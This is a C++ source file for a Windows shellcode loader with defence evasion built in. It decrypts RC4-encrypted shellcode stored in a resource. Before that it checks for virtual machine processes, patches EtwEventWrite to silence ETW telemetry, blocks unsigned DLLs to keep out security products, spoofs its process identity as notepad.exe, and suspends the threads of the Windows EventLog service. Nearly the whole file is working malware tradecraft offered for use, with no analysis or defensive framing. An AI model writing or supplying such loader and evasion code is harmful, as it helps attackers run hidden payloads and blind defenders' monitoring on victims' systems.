#include<windows.h>
#include<TlHelp32.h>
#include <stdio.h>
#include <string>
#include <ctime>


#define _WIN32_DCOM
#include <iostream>
#include <comdef.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

#include "winternl.h"
typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
#define PATH MAX_PATH

#include <dbghelp.h>
#include <Psapi.h>
#pragma comment(lib, "DbgHelp")
using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
	IN HANDLE          ThreadHandle,
	IN THREADINFOCLASS ThreadInformationClass,
	OUT PVOID          ThreadInformation,
	IN ULONG           ThreadInformationLength,
	OUT PULONG         ReturnLength
	);


#pragma comment(lib, "ntdll")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"wWinMainCRTStartup\"")


using namespace std;

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



typedef void* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
tNtVirtual oNtVirtual;


unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize);

void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}


struct CONFIG
{
	BOOL antisandbox;
	BOOL patchetw;
	BOOL onboot;
	BOOL blockdll;
	BOOL fuckpeb;
	BOOL fuckevent;
	unsigned char key[128];
};


void F1_1cksandbox()
{
	const char* list[10] = { "VBoxService.exe", "VBoxTray.exe", "vmware.exe", "vmtoolsd.exe","AcrylicService.exe","ShareIntApp.exe","prl_cc.exe","prl_tools.exe","vmusrvc.exe","vmsrvc.exe"};
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	BOOL bResult = Process32First(hProcessSnap, &pe32);
	while (bResult)
	{
		char sz_Name[MAX_PATH] = { 0 };
		WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, sz_Name, sizeof(sz_Name), NULL, NULL);
		for (int i = 0; i < 4; ++i)
		{
			if (strcmp(sz_Name, list[i]) == 0)
			{
				ExitProcess(0);
			}
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}

}


void Patchetw()
{

	void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
	char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	HANDLE hProc;
	DWORD pid = GetCurrentProcessId();	
	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
	NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);

}



//ONboot

void VenomB00t() {
	//自己写
	
}

//BLockdll
void B10cKD1L(){
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
	sp.MicrosoftSignedOnly = 1;
	SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));
}

//PEB欺骗
void F42kP3b() {
	HANDLE h = GetCurrentProcess();
	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG lenght = 0;
	HINSTANCE ntdll;
	MYPROC ptrNtQueryInformationProcess;
	wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
	ntdll = LoadLibrary(TEXT("Ntdll.dll"));
	ptrNtQueryInformationProcess = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");
	(ptrNtQueryInformationProcess)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
	TCHAR Buffer[PATH];
	GetCurrentDirectory(PATH, Buffer);
	DWORD cddwRet;
	const wchar_t* path = L"C:\\Windows\\System32";
	SetCurrentDirectory(path);
	GetCurrentDirectory(PATH, Buffer);
	ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
	ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;
}

void FuckEvent() {
	HANDLE serviceProcessHandle;
	HANDLE snapshotHandle;
	HANDLE threadHandle;

	HMODULE modules[256] = {};
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	WCHAR remoteModuleName[128] = {};
	HMODULE serviceModule = NULL;
	MODULEINFO serviceModuleInfo = {};
	DWORD_PTR threadStartAddress = 0;
	DWORD bytesNeeded = 0;

	myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	SERVICE_STATUS_PROCESS serviceStatusProcess = {};

	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
	DWORD servicePID = serviceStatusProcess.dwProcessId;


	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);


	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < modulesCount; i++)
	{
		serviceModule = modules[i];

		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));

		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
		{
			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
		}
	}

	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == servicePID)
		{
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
				if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
				{
					SuspendThread(threadHandle);
				}
		}
	}
}

void init(BOOL anti_sandbox, BOOL patchetw, BOOL onboot,BOOL blockdll,BOOL fuckpeb,BOOL fuckevent)
{
	if (anti_sandbox)
	{
		F1_1cksandbox();
	}
	if (patchetw)  
	{
		Patchetw();
	}
	if (onboot)
	{
		VenomB00t();
	}
	if (blockdll)
	{
		B10cKD1L();
	}
	if (fuckpeb)
	{
		F42kP3b();
	}
	if (fuckevent)
	{
		FuckEvent();
	}
}

unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
{
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL)
		return nullptr;
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return nullptr;
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return nullptr;
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL)
		return nullptr;
	CONFIG config = { 0 };
	memcpy(&config, pBuffer, sizeof(CONFIG));
	init(config.antisandbox, config.patchetw, config.onboot,config.blockdll,config.fuckpeb,config.fuckevent);
	shellcodeSize = totalSize - sizeof(CONFIG);
	unsigned char* shellcode = new unsigned char[shellcodeSize];
	memcpy(shellcode, (unsigned char*)pBuffer + sizeof(CONFIG), shellcodeSize);
	StreamCrypt(shellcode, shellcodeSize, config.key, 128);
	return shellcode;
}
